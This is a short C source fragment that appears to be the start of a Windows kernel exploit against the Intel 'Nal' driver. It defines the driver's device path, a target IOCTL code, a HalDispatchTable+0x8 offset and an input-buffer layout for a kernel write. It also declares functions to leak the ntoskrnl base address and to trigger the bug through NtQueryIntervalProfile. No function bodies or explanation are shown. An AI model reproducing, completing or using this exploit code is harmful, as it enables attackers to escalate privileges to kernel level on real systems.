#include <Windows.h>
#include <stdio.h>

#define DEVICE "\\\\.\\GLOBALROOT\\Device\\Nal"
#define TARGET_IOCTL 0x80862007

#define HAL_DISPATCH_TABLE_PLUS_0X8_OFFSET 0x1E3CE8

int main(int argc, char** argv);
void trigger_vulnerability(HANDLE h_nal, unsigned long long nt_base_address);

unsigned long long leak_ntoskrnl_base_address(HMODULE h_ntdll);

typedef struct _INPUT_BUFFER
{
	unsigned long long JumpTableCode;	// Offset: 0x0 (0)
	unsigned long long Padding1;		// Offset: 0x8 (8)
	unsigned long long Value;			// Offset: 0x10 (16)
	unsigned long long Destination;		// Offset: 0x18 (24)
	unsigned long long Length;			// Offset: 0x20 (32)
} INPUT_BUFFER, * PINPUT_BUFFER;

typedef unsigned int(__stdcall* NtQueryIntervalProfile)(
	unsigned int      ProfileSource,
	PULONG            Interval
	);